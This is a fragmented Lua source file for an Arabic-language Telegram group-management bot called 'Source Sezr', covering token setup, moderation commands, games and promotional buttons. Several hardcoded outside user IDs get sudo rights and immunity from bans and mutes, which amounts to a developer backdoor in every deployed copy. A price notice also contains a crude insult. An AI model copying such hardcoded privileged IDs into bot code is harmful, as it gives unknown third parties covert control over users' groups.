...
io.write('\27[0;31m\n ارسل لي توكن البوت الان ⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺ :\na⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n\27')
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
print('\27[0;31m⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n التوكن غير صحيح تاكد منه ثم ارسله')
else
...
print('\27[0;35m⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
os.execute('lua DRAGON.lua')
end
if not database:get(id_server..":SUDO:ID") then
io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺ :\na⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n\27[0;33;49m')
...
io.write('\27[1;31m ⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺ ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
...
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺ ⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺"
...
token = sudos.token 
--- start functions ⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺
--------------------------------------------------------------------------------------------------------------
...
sudo_users = {SUDO,1804119251,1372188096,1770493345}   
...
var = true
elseif tonumber(user_id) == tonumber(1776412898) then
var = true
...
if text == "/start" then
if not DevSoFi(msg) then
local Namebot = (database:get(bot_id..'Name:Bot') or 'السيزر') 
local BANDA_Msg = { 
...
{{text = 'المالك الديشا', url="t.me/XxDesha86Xx"}},
{{text = 'بوت تواصل سيزر',url="t.me/sezrrbot"}}, 
...
if not DevSoFi(msg) then
local Text = [[
┌ سعر السورس عند جابوا لو عموري غيرها هنيكك
├ السورسات بتبدا مت100لي 240ج
└ سعر المصنع200
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'المـبـرمــج سيزر', url="tt.me/s_e_z_r0"}},
{{text = 'بــوت تواصـل سيزر',url="https://t.me/surccesezr"}}, 
}
local msg_id = msg.id_/2097152/0.5
...
if DevSoFi(msg) then
local bl = 'مرحبا بك في كيب سورس سيزر 🎶🌎'
local keyboard = {
{'مبرمج السورس'},
...
local Text = ' 🎶🌎 تم ارسال الملصق من ⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n - '..Name
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/DEV_JABWA/50&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
send(msg.chat_id_, msg.id_,' 🎶🌎 اصدار سورس السيزر{ 3x☆}')
end
...
if text == 'سيزو مبرمج السورس' and DevSoFi(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
المبرمج سيزو لو حابب تتواصل معاه
اتبع الزر إلى تحت ⇈⇊
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
...
if text == 'عمري مبرمج السورس²' and DevSoFi(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
المبرمج عمري لو حابب تتواصل معاه
اتبع الزر إلى تحت ⇈⇊
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𝐌𝐎𝐑𝐀',url="t.me/BOT3mora"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
print("it is Bot")
N = (database:get(bot_id.."Name:Bot") or "السيزر")
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/DEV_JABWA/54&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'مين نصبلك' or text == 'عايزه بوت' or text == 'عايز بوت' then
local Text = [[
اهلا بك في سورس السيزر الجمدان
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝐃𝐄𝐕 𝐒𝐄𝐙𝐑',url="t.me/s_e_z_r0"}},
{{text = 'أضغط لاضافه ألبوت لمجموعتك 🎶🌎' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
}
local msg_id = msg.id_/2097152/0.5
...
local Text = [[
مطورين ومبرمجين سورس السيزر اتبع الازرار للتواصل معهم ⇈⇊
]]
keyboard = {} 
keyboard.inline_keyboard = {
...
"سؤال ينرفزك ؟ ", 
" هل يعجبك سورس السيزر؟؟ ", 
" اكثر ممثل تحبه ؟ ", 
"قد تخيلت شي في بالك وصار ؟ ", 
"شيء عندك اهم من الناس ؟ ", 
"تفضّل النقاش الطويل او تحب الاختصار ؟ ", 
"وش أخر شي ضيعته؟ ", 
"اي رايك في سورس السيزر؟ ", 
"كم مره حبيت؟ ", 
...
if text == 'السيزر' or text == 'سيزر' then
local Text = [[ 
من أحسن السورسات على التليجرام سورس السيزر
حمايه↤سرعه↤دقه↤وامان
 قناه السورس ⇈⇊
[𝚆𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 𝚂𝙾𝚄𝚁𝙲𝙴 𝚂𝙴𝚉𝚁](http://t.me/surccesezr)
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑', url="t.me/surccesezr"}}, 
...
local Text = [[  
↯ اهلا في قائمه الالعاب المتطوره سورس السيزر ↯
...
send(msg.chat_id_, msg.id_, " 🎶🌎 لا يمكنك حظر مالك الديشا \n")
return false 
end
...
send(msg.chat_id_, msg.id_, " 🎶🌎 لا تسطيع حظر مالك الديشا عام")
return false 
end
...
if tonumber(result.sender_user_id_) == tonumber(1770493345) then  
send(msg.chat_id_, msg.id_, " 🎶🌎 لا تسطيع كتم مالك الديشا عام")
return false 
end
...
send(msg.chat_id_, msg.id_, " 🎶🌎 لا يمكنك كتم مالك الديشا \n")
return false 
end
usertext = '\n 🎶🌎 العضو ← ['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n 🎶🌎 تم كتمه عام من {'..Groups..'} مجموعه'
...
t = ' 🎶🌎 ملفات السورس السيزر ⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n ⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺ \n'
i = 0
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
i = i + 1
...
send(msg.chat_id_, msg.id_," 🎶🌎 عذرا الملف لايدعم سورس السيزر\n") 
end
return false
end
...
if text == ("مسح قائمه السيزر") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n 🎶🌎 تم مسح قائمه السيزر')
return false
end

if text == 'قائمه السيزر' and Sudo(msg) then
...
if text == ("رفع السيزر") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع السيزر@(.*)$") and Sudo(msg) then
local username = text:match("^رفع السيزر@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع السيزر(%d+)$") and Sudo(msg) then
local userid = text:match("^رفع السيزر(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == ("تنزيل السيزر") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل السيزر@(.*)$") and Sudo(msg) then
local username = text:match("^تنزيل السيزر@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل السيزر(%d+)$") and Sudo(msg) then
local userid = text:match("^تنزيل السيزر(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'السيزر').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'السيزر')
local DRAGON_Msg = {
'نعم يروحي♥️🙈',
'نعم يا قلب  '..Namebot..'',
'عاوز اي من '..Namebot..'',
...
end --الكود حصري سورس السيزريعني لو بكتهن راح اعرفك انت الاخذتهن
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'السيزر').." غادر" or text == 'غادر' then  
...
🌨⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺iD ⇨ #id 🌨
🌨⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺Sta ⇨  #stast 🌨
🌨⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺Msg ⇨ #msgs 🌨
🌨⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺NaMe ⇨ #name  🌨
]],
[[
- ᴜѕᴇʀɴᴀᴍᴇ ➣ #username .
- ᴍѕɢѕ ➣ #msgs .
...
local Text = [[
 ...
 تحت لي في الزر الأسفل⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'السيزر')
